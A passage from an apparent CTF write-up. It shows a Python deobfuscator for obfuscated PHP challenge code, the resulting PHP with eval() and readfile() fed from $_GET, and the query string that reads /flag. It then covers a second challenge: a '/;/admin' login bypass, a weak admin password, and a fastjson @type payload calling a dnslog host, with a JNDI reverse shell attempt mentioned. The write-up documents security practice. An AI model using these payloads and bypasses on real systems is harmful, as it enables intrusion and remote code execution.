class="string">b&quot;&#x27;)&quot;</span>, jr+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># jr-=1</span></span><br><span class="line">    <span class="comment"># while fb[jr-1] == ord(&#x27;\\&#x27;) and jr-jl:</span></span><br><span class="line">    <span class="comment">#     jr = fb.find(b&quot;&#x27;&quot;, jr+1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&#x27;aaaaa:&#x27;, chr(fb[jr-1]))</span></span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    s = (fb[jl:jr])</span><br><span class="line">    s = s.replace(<span class="string">b&#x27;\\\\&#x27;</span>, <span class="string">b&#x27;\\&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">b&quot;\\&#x27;&quot;</span>, <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(s) == <span class="number">8</span></span><br><span class="line">    r = (<span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> (a, b) <span class="keyword">in</span> <span class="built_in">zip</span>(s, x)))</span><br><span class="line">    fb = fb[:jl] + r + fb[jr:]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    sv.add(r)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(eval(fb[jl:jr]))</span></span><br><span class="line"><span class="comment"># print(fb)</span></span><br><span class="line">fb = fb.replace(<span class="string">b&#x27;$DenKBzmP ^ $rbcwAIhe&#x27;</span>, <span class="string">b&#x27;$DenKBzmP&#x27;</span>)</span><br><span class="line">fb = fb.replace(fn_name, <span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">dumper = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function closure_dump(Closure $c) &#123;</span></span><br><span class="line"><span class="string">    $str = &#x27;function (&#x27;;</span></span><br><span class="line"><span class="string">    $r = new ReflectionFunction($c);</span></span><br><span class="line"><span class="string">    $params = array();</span></span><br><span class="line"><span class="string">    foreach($r-&gt;getParameters() as $p) &#123;</span></span><br><span class="line"><span class="string">        $s = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">        if($p-&gt;isArray()) &#123;</span></span><br><span class="line"><span class="string">            $s .= &#x27;array &#x27;;</span></span><br><span class="line"><span class="string">        &#125; else if($p-&gt;getClass()) &#123;</span></span><br><span class="line"><span class="string">            $s .= $p-&gt;getClass()-&gt;name . &#x27; &#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if($p-&gt;isPassedByReference())&#123;</span></span><br><span class="line"><span class="string">            $s .= &#x27;&amp;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $s .= &#x27;$&#x27; . $p-&gt;name;</span></span><br><span class="line"><span class="string">        if($p-&gt;isOptional()) &#123;</span></span><br><span class="line"><span class="string">            $s .= &#x27; = &#x27; . var_export($p-&gt;getDefaultValue(), TRUE);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $params []= $s;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $str .= implode(&#x27;, &#x27;, $params);</span></span><br><span class="line"><span class="string">    $str .= &#x27;)&#123;&#x27; . PHP_EOL;</span></span><br><span class="line"><span class="string">    $lines = file($r-&gt;getFileName());</span></span><br><span class="line"><span class="string">    for($l = $r-&gt;getStartLine(); $l &lt; $r-&gt;getEndLine(); $l++) &#123;</span></span><br><span class="line"><span class="string">        $str .= $lines[$l];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $str;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">fb = fb.splitlines()</span><br><span class="line">fb = <span class="string">b&#x27;\n&#x27;</span>.join(fb[:<span class="number">1</span>] + [dumper] + fb[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">s = fb[:(fb.find(<span class="string">b&#x27;PeuuUVqY&#x27;</span>))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">sv = <span class="built_in">sorted</span>(<span class="built_in">list</span>(sv))</span><br><span class="line">C_F = <span class="number">0</span> </span><br><span class="line">closures = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> sv:</span><br><span class="line">    l = s.splitlines()[:-<span class="number">1</span>]</span><br><span class="line">    l.append(<span class="string">f&quot;echo f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;);echo &#x27;ABABA&#x27;;&quot;</span>.encode())</span><br><span class="line">    l.append(<span class="string">f&quot;echo f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;);echo &#x27;ABABA&#x27;;&quot;</span>.encode())</span><br><span class="line">    l.append(<span class="string">f&quot;echo f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;);echo &#x27;ABABA&#x27;;&quot;</span>.encode())</span><br><span class="line">    d = <span class="string">b&#x27;\n&#x27;</span>.join(l)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;res.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(d)</span><br><span class="line">    out = subprocess.Popen([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;./res.php&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)</span><br><span class="line">    <span class="keyword">if</span> out.wait() == <span class="number">0</span>:</span><br><span class="line">        outlines = [ln <span class="keyword">for</span> ln <span class="keyword">in</span> out.stdout.read().split(<span class="string">b&#x27;ABABA&#x27;</span>)]</span><br><span class="line">        outlines = outlines[:<span class="number">3</span>]</span><br><span class="line">        <span class="built_in">print</span>(outlines)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(outlines)) == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(v, outlines[<span class="number">0</span>])</span><br><span class="line">            fb = fb.replace(<span class="string">f&quot;f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;)&quot;</span>.encode(), <span class="string">b&quot;\&#x27;&quot;</span>+outlines[<span class="number">0</span>]+<span class="string">b&quot;\&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;DUDU IS HERE&quot;</span>)</span><br><span class="line">        l = s.splitlines()[:-<span class="number">1</span>]</span><br><span class="line">        l.append(<span class="string">f&quot;echo closure_dump(f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;));&quot;</span>.encode())</span><br><span class="line">        d = <span class="string">b&#x27;\n&#x27;</span>.join(l)</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&#x27;res.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(d)</span><br><span class="line">        out = subprocess.Popen([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;./res.php&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)</span><br><span class="line">        out.wait()</span><br><span class="line">        closure_name = <span class="string">f&#x27;fclosure_<span class="subst">&#123;C_F&#125;</span>&#x27;</span></span><br><span class="line">        closure_code = out.stdout.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; == &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_eq&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; !== &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_noteq&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; %&#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_mod&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; &amp;&amp; &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_and&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; * &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_mul&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; &lt;&lt; &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_shl&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; - &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_sub&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; &gt; &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_greater&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; ?? &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_coalesce&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27; + &#x27;</span> <span class="keyword">in</span> closure_code:</span><br><span class="line">            closure_name = <span class="string">&#x27;f_add&#x27;</span></span><br><span class="line">        closure_name = <span class="string">&#x27;$&#x27;</span>+closure_name</span><br><span class="line">        closures += <span class="string">f&#x27;<span class="subst">&#123;closure_name&#125;</span>=&#x27;</span>.encode() + closure_code</span><br><span class="line">        closures += <span class="string">b&#x27;\n\n&#x27;</span></span><br><span class="line">        fb = fb.replace(<span class="string">f&quot;f(&#x27;<span class="subst">&#123;v.decode()&#125;</span>&#x27;)&quot;</span>.encode(), closure_name.encode())</span><br><span class="line">        C_F+=<span class="number">1</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;gzinflate&#x27;\(&#x27;(.*?)&#x27;\)&quot;</span>.encode(), flags=re.DOTALL)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern, fb):</span><br><span class="line">    <span class="built_in">print</span>(m.group(<span class="number">0</span>), m.group(<span class="number">1</span>))</span><br><span class="line">    b = escb(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\\&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;res.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(<span class="string">b&#x27;&lt;?php\necho &#x27;</span> + m.group(<span class="number">0</span>) + <span class="string">b&#x27;?&gt;&#x27;</span>)</span><br><span class="line">    out = subprocess.Popen([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;./res.php&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)</span><br><span class="line">    <span class="keyword">if</span> out.wait() == <span class="number">0</span>:</span><br><span class="line">        fb = fb.replace(m.group(<span class="number">0</span>), <span class="string">b&quot;&#x27;&quot;</span> + out.stdout.read() + <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;join&#x27;\(&#x27;&#x27;(.*?)\)\)&quot;</span>.encode(), flags=re.DOTALL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern, fb):</span><br><span class="line">    <span class="built_in">print</span>(m.group(<span class="number">0</span>), m.group(<span class="number">1</span>))</span><br><span class="line">    b = escb(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\\&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;res.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(<span class="string">b&#x27;&lt;?php\necho &#x27;</span> + m.group(<span class="number">0</span>) + <span class="string">b&#x27;?&gt;&#x27;</span>)</span><br><span class="line">    out = subprocess.Popen([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;./res.php&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)</span><br><span class="line">    <span class="keyword">if</span> out.wait() == <span class="number">0</span>:</span><br><span class="line">        fb = fb.replace(m.group(<span class="number">0</span>), <span class="string">b&quot;&#x27;&quot;</span> + out.stdout.read() + <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;strrev&#x27;\(&#x27;(.*?)&#x27;\)&quot;</span>.encode())</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern, fb):</span><br><span class="line">    <span class="built_in">print</span>(m.group(<span class="number">0</span>), m.group(<span class="number">1</span>))</span><br><span class="line">    b = escb(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\\&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">    fb = fb.replace(m.group(<span class="number">0</span>), <span class="string">b&quot;&#x27;&quot;</span> + m.group(<span class="number">1</span>)[::-<span class="number">1</span>] + <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;base64_decode&#x27;\(&#x27;(.*?)&#x27;\)&quot;</span>.encode())</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern, fb):</span><br><span class="line">    <span class="built_in">print</span>(m.group(<span class="number">0</span>), m.group(<span class="number">1</span>))</span><br><span class="line">    b = escb(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\\&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">    fb = fb.replace(m.group(<span class="number">0</span>), <span class="string">b&quot;&#x27;&quot;</span> + base64.b64decode(m.group(<span class="number">1</span>)) + <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;str_rot13&#x27;\(&#x27;(.*?)&#x27;\)&quot;</span>.encode(), flags=re.DOTALL)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern, fb):</span><br><span class="line">    <span class="built_in">print</span>(m.group(<span class="number">0</span>), m.group(<span class="number">1</span>))</span><br><span class="line">    b = escb(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\\&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;res.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(<span class="string">b&#x27;&lt;?php\necho &#x27;</span> + m.group(<span class="number">0</span>) + <span class="string">b&#x27;?&gt;&#x27;</span>)</span><br><span class="line">    out = subprocess.Popen([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;./res.php&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)</span><br><span class="line">    <span class="keyword">if</span> out.wait() == <span class="number">0</span>:</span><br><span class="line">        fb = fb.replace(m.group(<span class="number">0</span>), <span class="string">b&quot;&#x27;&quot;</span> + out.stdout.read() + <span class="string">b&quot;&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">fb = fb.splitlines()</span><br><span class="line">fb = <span class="string">b&#x27;\n&#x27;</span>.join(fb[:<span class="number">1</span>] + [closures] + fb[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;ans.php&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(fb)</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>This is where my deobfuscator ends and I figured I could do rest in less than 2 hours and faster than writing code for it.</p>
<h3><span id="manual-labor">Manual labor :)</span><a href="#manual-labor" class="header-anchor"></a></h3><p>Main obfuscation that is left is <code>goto</code>‘s I started from first goto and would cut and paste <code>goto</code> where it was intended. going along reading code and understanding which branch was useless. There was also some <code>xdebug</code> stuff which I don’t know what it is. I guess it’s anti debugging feature.<br>So here’s the important code left:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$f_eq</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$AqgGmhEL</span>, <span class="variable">$yglIFDcU</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$AqgGmhEL</span> == <span class="variable">$yglIFDcU</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_mod</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lVAHbUyT</span>, <span class="variable">$ZmDBPQQb</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$lVAHbUyT</span> % <span class="variable">$ZmDBPQQb</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_noteq</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$UkaweGRn</span>, <span class="variable">$BTnLyVMj</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$UkaweGRn</span> !== <span class="variable">$BTnLyVMj</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_shl</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$brwBPZbi</span>, <span class="variable">$XSqYpVLM</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$brwBPZbi</span> &lt;&lt; <span class="variable">$XSqYpVLM</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_add</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$chPCUzwi</span>, <span class="variable">$jQZIfWpC</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$chPCUzwi</span> + <span class="variable">$jQZIfWpC</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_and</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$GCzgcwRK</span>, <span class="variable">$RpMPZpmj</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$GCzgcwRK</span> &amp;&amp; <span class="variable">$RpMPZpmj</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_coalesce</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$jfqPCCoG</span>, <span class="variable">$xPNsVfmy</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$jfqPCCoG</span> ?? <span class="variable">$xPNsVfmy</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_sub</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$RwedYeNC</span>, <span class="variable">$PXlHwEDN</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$RwedYeNC</span> - <span class="variable">$PXlHwEDN</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$fclosure_8</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$rawCNgUo</span>, <span class="variable">$QHoVWrjC</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rawCNgUo</span> || <span class="variable">$QHoVWrjC</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_mul</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ViVEpUJC</span>, <span class="variable">$bswJJhBe</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ViVEpUJC</span> * <span class="variable">$bswJJhBe</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="variable">$f_greater</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$BQzBQbgM</span>, <span class="variable">$NMCgZusp</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$BQzBQbgM</span> &gt; <span class="variable">$NMCgZusp</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$g_1</span> = <span class="variable">$g_2</span> = <span class="variable">$g_3</span> = <span class="variable">$g_4</span> = <span class="variable">$g_5</span> = <span class="variable">$DqWdnYFI</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$g_1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;JnXB&#x27;</span>];</span><br><span class="line"><span class="variable">$g_2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xMSd&#x27;</span>];</span><br><span class="line"><span class="variable">$g_3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;kgdG&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$f_eq</span>(<span class="variable">$f_add</span>(<span class="variable">$f_add</span>(<span class="variable">$g_1</span>, <span class="variable">$g_2</span>), <span class="variable">$g_3</span>), <span class="variable">$f_mod</span>(<span class="number">1773</span>, <span class="number">1056</span>))) &#123;</span><br><span class="line">    <span class="variable">$g_4</span> = <span class="variable">$_GET</span>[<span class="variable">$g_1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">WknXvLos:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$f_eq</span>(<span class="variable">$f_add</span>(<span class="variable">$f_add</span>(<span class="variable">$g_1</span>, <span class="variable">$g_2</span>), <span class="variable">$g_3</span>), <span class="variable">$f_coalesce</span>(<span class="variable">$JXNMXmCP</span>, <span class="number">266</span>))) &#123;</span><br><span class="line">    <span class="variable">$g_5</span> = <span class="variable">$_GET</span>[<span class="variable">$g_2</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$g_5</span> = <span class="variable">$f_add</span>(<span class="variable">$f_add</span>(<span class="variable">$g_1</span>, <span class="variable">$g_2</span>), <span class="variable">$g_3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="variable">$g_4</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$f_sub</span>(<span class="string">&#x27;2624yAXHpMmO&#x27;</span>, <span class="number">2623</span>):</span><br><span class="line">        <span class="variable">$g_4</span> = <span class="variable">$fclosure_8</span>(<span class="string">&#x27;parse_str&#x27;</span>(<span class="string">&#x27;BOFs=L2ZsYWc=&#x27;</span>, <span class="variable">$oIZrLxSJ</span>), <span class="variable">$oIZrLxSJ</span>) ? <span class="string">&#x27;base64_decode&#x27;</span>(<span class="variable">$oIZrLxSJ</span>[<span class="string">&#x27;BOFs&#x27;</span>]) : <span class="variable">$oIZrLxSJ</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$f_sub</span>(<span class="string">&#x27;41PvInuuZE&#x27;</span>, <span class="number">39</span>):</span><br><span class="line">        <span class="variable">$g_5</span> = <span class="variable">$_GET</span>[<span class="variable">$g_2</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$f_sub</span>(<span class="string">&#x27;4753VUgALPCe&#x27;</span>, <span class="number">4750</span>):</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$g_5</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$f_add</span>(<span class="variable">$f_shl</span>(<span class="number">1</span>, <span class="number">2</span>), <span class="number">0</span>): <span class="comment">// I chose to go down this branch</span></span><br><span class="line">        <span class="variable">$DqWdnYFI</span> = <span class="variable">$fclosure_8</span>(<span class="string">&#x27;parse_str&#x27;</span>(<span class="string">&#x27;ISzI=ZkZzZXBhTVc=&#x27;</span>, <span class="variable">$FKFDXVHC</span>), <span class="variable">$FKFDXVHC</span>) ? <span class="string">&#x27;base64_decode&#x27;</span>(<span class="variable">$FKFDXVHC</span>[<span class="string">&#x27;ISzI&#x27;</span>]) : <span class="variable">$FKFDXVHC</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$f_and</span>(<span class="variable">$f_and</span>(<span class="variable">$f_and</span>(<span class="variable">$_GET</span>[<span class="variable">$DqWdnYFI</span>], <span class="variable">$f_eq</span>(<span class="variable">$g_5</span>, <span class="variable">$g_4</span>)), <span class="variable">$f_greater</span>(<span class="variable">$g_1</span>, <span class="variable">$f_sub</span>(<span class="string">&#x27;7299EPrJnVdz&#x27;</span>, <span class="number">6299</span>))), !<span class="string">&#x27;strpos&#x27;</span>(<span class="variable">$_GET</span>[<span class="variable">$DqWdnYFI</span>], <span class="string">&#x27;/flag&#x27;</span>))) &#123;</span><br><span class="line">    <span class="string">&#x27;readfile&#x27;</span>(<span class="variable">$_GET</span>[<span class="variable">$DqWdnYFI</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I’ve renamed variables that we might control as $g_x. We can either control g_4 or g_5. But controlling g_5 loses us control over the big switch so I chose to control g_4. to get flag using final <code>readfile</code> g_5 needs to be equal to g_4. There’s more so I won’t bore you with it…<br>Basically after going though many cases I’ve figured out final parameters that was needed for solution:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JnXB</span>=<span class="number">1001</span>&amp;xMSd=<span class="number">10</span>&amp;kgdG=-<span class="number">294</span>&amp;<span class="number">1001</span>=<span class="number">717</span>&amp;<span class="number">717</span>=<span class="number">4</span>&amp;fFsepaMW=/flag</span><br></pre></td></tr></table></figure>
<p>It’s just case work and not really interesting. It took me 2 restarts of the challenge so about 4-5 hours.</p>
<h2><span id="baby-gadget-v1-0">baby gadget v1.0</span><a href="#baby-gadget-v1-0" class="header-anchor"></a></h2><p><code>/;/admin</code> 可以绕过登录，但是得在 burp ，浏览器会被跳转</p>
<blockquote>
<p>在队友的 Fuzz 下发现 密码 是个 弱密码 admin:admin123<br>发现 &#x2F;;&#x2F;admin&#x2F;download.jsp?filename&#x3D;lib.zip 下到了依赖，看到有 fastjson ，一顿搜。然后根据 <a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">红队武器库: fastjson 小于 1.2.68 全漏洞RCE利用 exploit</a> 直接试一下能不能产生 dnslog</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>但是比较蛋疼的是我这个脚本小子用一些 JNDI 工具竟然打不了，触发了恶意类访问但是没反弹回来 shell ，于是根据文章自己手动搭建一个恶意的服务</p>
